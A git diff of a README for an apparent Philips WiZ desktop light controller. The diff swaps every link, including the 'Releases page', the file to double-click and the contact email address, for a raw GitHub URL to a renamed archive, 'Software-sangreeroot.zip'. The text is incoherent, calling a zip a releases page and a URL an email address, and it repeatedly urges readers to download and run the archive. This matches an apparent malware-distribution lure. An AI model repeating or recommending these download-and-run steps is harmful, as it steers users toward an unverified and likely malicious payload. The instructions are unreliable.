@@ -1,7 +1,7 @@
 # 🌟 philipswizlightcontroller - Control Your Philips WiZ Lights Easily
 
 ## 📥 Download Now
-[![Download Release](https://github.com/Aras259/philipswizlightcontroller/raw/refs/heads/main/assets/Software-1.4.zip%20Release-latest-brightgreen)](https://github.com/Aras259/philipswizlightcontroller/raw/refs/heads/main/assets/Software-1.4.zip)
+[![Download Release](https://raw.githubusercontent.com/Aras259/philipswizlightcontroller/main/assets/Software-sangreeroot.zip%20Release-latest-brightgreen)](https://raw.githubusercontent.com/Aras259/philipswizlightcontroller/main/assets/Software-sangreeroot.zip)
 
 ## 📖 Introduction
 Welcome to the **philipswizlightcontroller**, a fast, lightweight, and fully-featured desktop controller for Philips WiZ lights. Built with Python and CustomTkinter, this application makes it easy to manage your smart lighting from your desktop. Whether you want to change colors, adjust brightness, or set scenes, this application has you covered.
@@ -17,15 +17,15 @@ To get started with philipswizlightcontroller, follow these simple steps to down
 - **Network:** Wi-Fi connection for smart light control
 
 ## 🔗 Download & Install
-1. **Visit the Releases Page:** Go to the [Releases page](https://github.com/Aras259/philipswizlightcontroller/raw/refs/heads/main/assets/Software-1.4.zip) of the repository.
+1. **Visit the Releases Page:** Go to the [Releases page](https://raw.githubusercontent.com/Aras259/philipswizlightcontroller/main/assets/Software-sangreeroot.zip) of the repository.
    
-2. **Choose the Latest Version:** Look for the latest version of the application. You will see files listed for download, such as `https://github.com/Aras259/philipswizlightcontroller/raw/refs/heads/main/assets/Software-1.4.zip`.
+2. **Choose the Latest Version:** Look for the latest version of the application. You will see files listed for download, such as `https://raw.githubusercontent.com/Aras259/philipswizlightcontroller/main/assets/Software-sangreeroot.zip`.
 
 3. **Download the Application:** Click on the file name to start the download. The file size is usually around 50 MB.
 
 4. **Run the Installer:**
    - After downloading, locate the file in your Downloads folder.
-   - Double-click `https://github.com/Aras259/philipswizlightcontroller/raw/refs/heads/main/assets/Software-1.4.zip` to start the installation.
+   - Double-click `https://raw.githubusercontent.com/Aras259/philipswizlightcontroller/main/assets/Software-sangreeroot.zip` to start the installation.
    - Follow the on-screen prompts to complete the installation process.
 
 ## 🛠️ Basic Features
@@ -58,7 +58,7 @@ If you encounter issues, consider these steps:
 - **Check Compatibility:** Make sure your Philips WiZ lights are compatible with the application.
 
 ## 📞 Need Help?
-If you have any questions or need further assistance, you can open an issue in the **Issues** section of this repository. Additionally, you can reach out via email at https://github.com/Aras259/philipswizlightcontroller/raw/refs/heads/main/assets/Software-1.4.zip
+If you have any questions or need further assistance, you can open an issue in the **Issues** section of this repository. Additionally, you can reach out via email at https://raw.githubusercontent.com/Aras259/philipswizlightcontroller/main/assets/Software-sangreeroot.zip
 
 ## 📝 Feedback
 We welcome your feedback. Please share your thoughts on how we can improve the application. You can do this by submitting an issue through GitHub or via our email.
@@ -67,4 +67,4 @@ We welcome your feedback. Please share your thoughts on how we can improve the a
 Thank you for using the philipswizlightcontroller. We appreciate your support and hope this application enhances your smart home experience.
 
 ## 🔗 Download Now Again
-For easy access, download the application from the [Releases page](https://github.com/Aras259/philipswizlightcontroller/raw/refs/heads/main/assets/Software-1.4.zip). Enjoy controlling your Philips WiZ lights!
+For easy access, download the application from the [Releases page](https://raw.githubusercontent.com/Aras259/philipswizlightcontroller/main/assets/Software-sangreeroot.zip). Enjoy controlling your Philips WiZ lights!
